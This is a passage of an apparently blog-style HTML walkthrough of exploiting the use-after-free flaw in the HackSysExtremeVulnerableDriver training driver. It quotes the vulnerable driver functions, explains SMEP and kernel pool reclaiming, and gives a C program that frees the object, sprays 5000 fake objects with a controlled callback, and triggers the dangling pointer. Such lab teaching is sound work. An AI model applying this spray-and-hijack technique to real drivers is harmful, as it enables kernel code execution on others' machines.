+    <a href="#useuaf-function" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>And that is whay does <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c#L173" target="_blank" rel="noopener"><code>UseUaFObjectNonPagedPool</code></a>, executed what is on <code>g_UseAfterFreeObjectNonPagedPool-&gt;Callback()</code>, if it exists.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">UseUaFObjectNonPagedPool</span><span class="p">(</span><span class="n">VOID</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">PAGED_CODE</span><span class="p">();</span> 
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Using UaF Object</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] g_UseAfterFreeObjectNonPagedPool: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] g_UseAfterFreeObjectNonPagedPool-&gt;Callback: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="o">-&gt;</span><span class="n">Callback</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Calling Callback</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="o">-&gt;</span><span class="n">Callback</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="o">-&gt;</span><span class="nf">Callback</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<p>This will be displayed in the assembly as a conditional jump: <code>jne</code> followed with an <code>call rcx</code>, but that&rsquo;s a problem for your future self.</p>
+<p>After seeing this both functions, you will be asking, but why is this vulnerable to UAF, it only executes a buffer in a secure structure and you are right, the vulnerability shows in the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver/blob/master/Driver/HEVD/Windows/UseAfterFreeNonPagedPool.c#L213" target="_blank" rel="noopener"><code>FreeUaFObjectNonPagedPool</code></a> function.</p>
+<h4>FreeUaF Function<span class="hx-absolute -hx-mt-20" id="freeuaf-function"></span>
+    <a href="#freeuaf-function" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>Here is where the problem begins, when the object is freed the <code>g_UseAfterFreeObjectNonPagedPool</code> still holds the reference to a dangling pointer, that you can abuse to overwrite whatever you want and execute directly a shellcode (but luckily we have SMEP activated so we can&rsquo;t execute directly a shellcode)</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">FreeUaFObjectNonPagedPool</span><span class="p">(</span><span class="n">VOID</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_UNSUCCESSFUL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">PAGED_CODE</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Freeing UaF Object</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">STRINGIFY</span><span class="p">(</span><span class="n">POOL_TAG</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">ExFreePoolWithTag</span><span class="p">((</span><span class="n">PVOID</span><span class="p">)</span><span class="n">g_UseAfterFreeObjectNonPagedPool</span><span class="p">,</span> <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">POOL_TAG</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h5>SMEP (brief explanation)<span class="hx-absolute -hx-mt-20" id="smep-brief-explanation"></span>
+    <a href="#smep-brief-explanation" class="subheading-anchor" aria-label="Permalink for this section"></a></h5><p>SMEP also know as Supervisor Mode Execution Preventions, is the protection encharged to avoid the kernel to execute code in user-mode space. To see if it is active you can check the 20th bit of the Control Register 4 (<strong>cr4</strong>), it is enable if the bit is up, in other words, their value is non-zero.</p>
+<p>For more detailed explication of the protection please check j00ru&rsquo;s blog:
+<a href="https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/" target="_blank" rel="noopener">https://j00ru.vexillium.org/2011/06/smep-what-is-it-and-how-to-beat-it-on-windows/</a></p>
+<h4>AllocateFake Function<span class="hx-absolute -hx-mt-20" id="allocatefake-function"></span>
+    <a href="#allocatefake-function" class="subheading-anchor" aria-label="Permalink for this section"></a></h4><p>No detailed explanation, allocates fake object.</p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="n">NTSTATUS</span> <span class="nf">AllocateFakeObjectNonPagedPool</span><span class="p">(</span><span class="n">_In_</span> <span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span> <span class="n">UserFakeObject</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">NTSTATUS</span> <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_SUCCESS</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span> <span class="n">KernelFakeObject</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">PAGED_CODE</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Creating Fake Object</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">KernelFakeObject</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span><span class="p">)</span><span class="nf">ExAllocatePoolWithTag</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="n">NonPagedPool</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="n">POOL_TAG</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">KernelFakeObject</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[-] Unable to allocate Pool chunk</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">Status</span> <span class="o">=</span> <span class="n">STATUS_NO_MEMORY</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Tag: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">STRINGIFY</span><span class="p">(</span><span class="n">POOL_TAG</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Type: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">STRINGIFY</span><span class="p">(</span><span class="n">NonPagedPool</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Size: 0x%zX</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Pool Chunk: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">KernelFakeObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">ProbeForRead</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">UserFakeObject</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">ULONG</span><span class="p">)</span><span class="nf">__alignof</span><span class="p">(</span><span class="n">UCHAR</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">RtlCopyMemory</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">KernelFakeObject</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">(</span><span class="n">PVOID</span><span class="p">)</span><span class="n">UserFakeObject</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">KernelFakeObject</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">[</span><span class="k">sizeof</span><span class="p">(</span><span class="n">KernelFakeObject</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="sc">&#39;\0&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DbgPrint</span><span class="p">(</span><span class="s">&#34;[+] Fake Object: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">KernelFakeObject</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">Status</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
+    <div class="success-icon hx-hidden group-[.copied]/copybtn:hx-block hx-pointer-events-none hx-h-4 hx-w-4"></div>
+  </button>
+</div>
+</div>
+<h2>Initial Analysis<span class="hx-absolute -hx-mt-20" id="initial-analysis"></span>
+    <a href="#initial-analysis" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>I was surprise when taking resources for this blogs the amount of exhaustive walkthoughts doing Heap Grooming or techniques like: <a href="https://www.alex-ionescu.com/kernel-heap-spraying-like-its-2015-swimming-in-the-big-kids-pool/" target="_blank" rel="noopener">Heap Fengshui</a>. For the exploit of this UAF is not necesary, but useful for other complex attacks, despite talking about this technique is a very soft way to understand how the kernel heap, also known as kernel pools, works in.</p>
+<h3>How ExAllocatePool works<span class="hx-absolute -hx-mt-20" id="how-exallocatepool-works"></span>
+    <a href="#how-exallocatepool-works" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>This function routine allocates pool memory of the specified type and returns a pointer to the allocated block, in other words is like the <code>malloc</code> you are used while writing user-mode scripts.</p>
+<p>Each pool has its own tag, usually this tag shows up where the pool come from, what is used for, or any identification, anyways you can see more in the microsoft wiki.</p>
+<p><a href="https://techcommunity.microsoft.com/blog/askperf/an-introduction-to-pool-tags/372983" target="_blank" rel="noopener">https://techcommunity.microsoft.com/blog/askperf/an-introduction-to-pool-tags/372983</a></p>
+<p>In UAF HEVD exploitation, we pay close attention to the Non-Paged Pool. When the driver frees an object but keeps a &ldquo;dangling pointer&rdquo; to it, we need to &ldquo;occupy&rdquo; that exact memory address before the driver uses it again.</p>
+<p>Thats why <strong>Named Pipes</strong> are used in this kernel vulnerabilites. Functions like ExAllocatePoolWithTag take a NumberOfBytes argument. By using Pipes, an attacker can trigger allocations of an arbitrary size. If we spray the pool with objects that match the size of the freed HEVD object, the Pool Manager is highly likely to place our controlled data in the recently vacated slot. This technique is known as Pool Reclaiming, and it allows us to hijack the execution flow when the driver eventually follows that dangling pointer.</p>
+<p>If you have payed attention, its exactly the same functionality as an Use-After-Free in user-mode. To conclude, we need to know that the kernel adds a <strong>Pool Header</strong>  (usually 0x10 bytes of length in x64), so if an object size if 0x50, you will allocate 0x60 bytes.</p>
+<h3>PoolMoonX<span class="hx-absolute -hx-mt-20" id="poolmoonx"></span>
+    <a href="#poolmoonx" class="subheading-anchor" aria-label="Permalink for this section"></a></h3><p>With the tool: <a href="https://github.com/zodiacon/PoolMonX" target="_blank" rel="noopener">PoolMoonX</a> of  Pavel Yosifovich, we are able to list all the pools of the operative system. If we monitor the pool tag: Non-Paged, NpFr, we can see the number of Allocs and the size in Bytes.</p>
+<p><img src="image.png" alt="" loading="lazy" /></p>
+<p>We can also create 10 pipes to see if the number of allocations changes:</p>
+<p><img src="Pasted%20image%2020260331113105.png" alt="" loading="lazy" /></p>
+<p>In this case, only 100 of new allocations occurs, but you can increment the iterations in a for-loop to allocate more and more pools to collapse the kernel.</p>
+<h2>Flow Hijacking<span class="hx-absolute -hx-mt-20" id="flow-hijacking"></span>
+    <a href="#flow-hijacking" class="subheading-anchor" aria-label="Permalink for this section"></a></h2><p>Once we know the theory we are able to hijack the value of the callback, to debug and see its changes you can use DebugView Tool, for being able to watch <code>DbgPrint</code> messages from the vulnerable driver.</p>
+<p><img src="image-1.png" alt="" loading="lazy" /></p>
+<div class="hextra-code-block hx-relative hx-mt-6 first:hx-mt-0 hx-group/code">
+
+<div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&#34;UAFHEVD.h&#34;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;Psapi.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">DWORD</span> <span class="n">bytesReturned</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">HANDLE</span> <span class="n">hFile</span> <span class="o">=</span> <span class="nf">CreateFile</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">        <span class="sa">L</span><span class="s">&#34;</span><span class="se">\\\\</span><span class="s">.</span><span class="se">\\</span><span class="s">HackSysExtremeVulnerableDriver&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">GENERIC_READ</span> <span class="o">|</span> <span class="n">GENERIC_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="n">FILE_SHARE_READ</span> <span class="o">|</span> <span class="n">FILE_SHARE_WRITE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="n">OPEN_EXISTING</span><span class="p">,</span> <span class="n">FILE_ATTRIBUTE_NORMAL</span><span class="p">,</span> <span class="nb">NULL</span>
+</span></span><span class="line"><span class="cl">    <span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">hFile</span> <span class="o">==</span> <span class="n">INVALID_HANDLE_VALUE</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] Driver not found: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Driver handle: 0x%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Allocate the UAF object
+</span></span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Allocating UAF Object...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_ALLOCATE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] UAF Object allocated</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Free
+</span></span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Freeing UAF Object...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_FREE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Dangling pointer live</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span> <span class="n">fakeObj</span> <span class="o">=</span> <span class="p">(</span><span class="n">PFAKE_OBJECT_NON_PAGED_POOL</span><span class="p">)</span><span class="nf">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="n">fakeObj</span><span class="o">-&gt;</span><span class="n">Callback</span> <span class="o">=</span> <span class="mh">0xDEADBEEFDEADBEEF</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">RtlFillMemory</span><span class="p">(</span><span class="n">fakeObj</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fakeObj</span><span class="o">-&gt;</span><span class="n">Buffer</span><span class="p">),</span><span class="mh">0x59</span><span class="p">);</span> <span class="c1">// Fill with Y
+</span></span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Spraying %d fake objects...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">5000</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5000</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">DeviceIoControl</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">            <span class="n">hFile</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">HEVD_IOCTL_ALLOCATE_FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">            <span class="n">fakeObj</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">FAKE_OBJECT_NON_PAGED_POOL</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[-] AllocateFakeObject[%d] failed: %d</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="nf">GetLastError</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[+] Spray done</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Trigger
+</span></span></span><span class="line"><span class="cl">    <span class="nf">printf</span><span class="p">(</span><span class="s">&#34;[*] Triggering UAF...</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">DeviceIoControl</span><span class="p">(</span><span class="n">hFile</span><span class="p">,</span> <span class="n">HEVD_IOCTL_USE_UAF_OBJECT_NON_PAGED_POOL</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">bytesReturned</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="nf">CloseHandle</span><span class="p">(</span><span class="n">hFile</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></div></div><div class="hextra-code-copy-btn-container hx-opacity-0 hx-transition group-hover/code:hx-opacity-100 hx-flex hx-gap-1 hx-absolute hx-m-[11px] hx-right-0 hx-top-0">
+  <button
+    class="hextra-code-copy-btn hx-group/copybtn hx-transition-all active:hx-opacity-50 hx-bg-primary-700/5 hx-border hx-border-black/5 hx-text-gray-600 hover:hx-text-gray-900 hx-rounded-md hx-p-1.5 dark:hx-bg-primary-300/10 dark:hx-border-white/10 dark:hx-text-gray-400 dark:hover:hx-text-gray-50"
+    title="Copy code"
+  >
+    <div class="copy-icon group-[.copied]/copybtn:hx-hidden hx-pointer-events-none hx-h-4 hx-w-4"></div>
